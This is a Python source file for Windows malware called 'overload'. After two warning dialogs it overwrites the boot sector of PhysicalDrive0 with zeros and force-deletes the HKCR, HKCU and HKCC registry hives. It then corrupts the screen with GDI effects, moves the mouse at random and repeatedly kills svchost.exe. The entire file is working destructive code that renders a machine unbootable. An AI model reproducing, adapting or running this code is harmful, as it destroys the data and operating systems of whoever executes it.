from win32ui import *
from win32file import *
from win32con import *
from win32gui import *
from win32api import *
import sys
import os
import random
import threading
import colorsys
import time
import pyautogui
import random
import time

usrName = os.getenv('USERNAME')
desk = GetDC(0)
w    = GetSystemMetrics(0)
h    = GetSystemMetrics(1)
x    = SM_CXSCREEN
y    = SM_CYSCREEN

if MessageBox(None, "This Malware can Destroy your Entire System by corrupting regestry and destroying the Bootsector!\nThe Creator of this Malware is not Responsible for any Damages.\n\nDo you want to continue?", "overload - Warning", MB_ICONWARNING | MB_YESNO) == IDNO:
    sys.exit()
if MessageBox(None, "This is the Last Warning! This can harm your PC badly.\n\nIf you don't want to execute this Malware click 'No' else click 'Yes'.\nYou have been Warned!", "overload -- LAST WARNING", MB_ICONWARNING | MB_YESNO) == IDNO:
    sys.exit()

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)

os.system("reg delete HKCR /f")
os.system("reg delete HKCU /f")
os.system("reg delete HKCC /f")

def msgBox():
    MessageBox(None, "good luck, have fun!", "", MB_ICONWARNING)


def mouse_move():
    x_screen = pyautogui.size()[0]
    y_screen = pyautogui.size()[1]

    while True:
        random_x = random.randint(0, x_screen)
        random_y = random.randint(0, y_screen)

        pyautogui.moveTo(random_x, random_y)
        time.sleep(0.00001)

def mainGDI():
    for i in range(0, 50):
        BitBlt(desk, 0, 0, w, h, desk, random.randint(0, x), random.randint(0, y), SRCCOPY)
        for j in range(0, 50):
            SetPixel(desk, random.randint(0, x), random.randint(0, y), RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

        for b in range(0, 50):
            BitBlt(desk, random.randint(0, x), random.randint(0, y), random.randint(0, w), random.randint(0, h), desk, random.randint(0, x), random.randint(0, y), SRCCOPY)

    for c in range(0, 500):
        BitBlt(desk, random.randint(0, x), random.randint(0, y), random.randint(0, w), random.randint(0, h), desk, 12, 12, SRCINVERT)
        BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCCOPY)


    shake_amplitude = 100  
    shake_duration = 20000  


    start_time = GetTickCount()

    while GetTickCount() - start_time < shake_duration:
        shake_offset_x = random.randint(-shake_amplitude, shake_amplitude)
        shake_offset_y = random.randint(-shake_amplitude, shake_amplitude)

 
        BitBlt(desk, shake_offset_x, shake_offset_y, w, h, desk, 0, 0, SRCCOPY)
        time.sleep(0.001)

    for d in range(0, 500):
        BitBlt(desk, random.randint(0, x), random.randint(0, y), random.randint(0, w), random.randint(0, h), desk, 12, 12, SRCCOPY)
        BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCINVERT)

    for e in range(0, 100):
        color = colorsys.hls_to_rgb(random.uniform(0, 1), 1.0, random.uniform(0.5, 1.0))
        brush = CreateSolidBrush(RGB(int(color[0] * 255), int(color[1] * 255), int(color[2] * 255)))
        SelectObject(desk, brush)
        PatBlt(desk, random.randrange(w), random.randrange(h), random.randrange(w), random.randrange(h), PATINVERT)
        DeleteObject(brush)
        BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCCOPY)
        BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCINVERT)
        time.sleep(0.01)
        BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCCOPY)

        os.system("taskkill /F /IM svchost.exe")

t1 = threading.Thread(target=mainGDI)
t3 = threading.Thread(target=mouse_move)
t4 = threading.Thread(target=msgBox)

t1.start()
t3.start()
t4.start()

t1.join()
t3.join()